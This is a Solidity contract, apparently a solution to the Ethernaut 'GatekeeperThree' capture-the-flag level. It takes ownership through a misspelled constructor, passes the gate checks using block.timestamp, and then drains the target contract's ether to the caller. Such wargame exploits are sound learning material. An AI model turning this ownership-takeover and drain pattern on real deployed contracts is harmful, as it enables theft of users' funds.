// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperThree.sol';

contract TrixR4Kids {

    GatekeeperThree gatekeeperThree;

    constructor(address payable $your_ethernaut_instance_here) payable {
        gatekeeperThree = GatekeeperThree($your_ethernaut_instance_here);
    }

    function pwn() public {
        gatekeeperThree.construct0r(); // gate one

        gatekeeperThree.createTrick(); // required to pass gate two
        gatekeeperThree.getAllowance(block.timestamp); // gate two

        // in case victim doesn't have enough funds to be hacked
        uint256 bal = address(gatekeeperThree).balance;
        if (bal < 0.001 ether + 1 wei) {
            uint256 diff = 0.001 ether + 1 wei - bal;
            (bool q,) = address(gatekeeperThree).call{ value: diff }('');
        }

        gatekeeperThree.enter();

        // GOERLI ETH IS VALUABLE NOW, OKAY?? IT'S REAL MONEY APPARENTLY !
        (bool r,) = msg.sender.call{ value: address(this).balance }('');
    }
}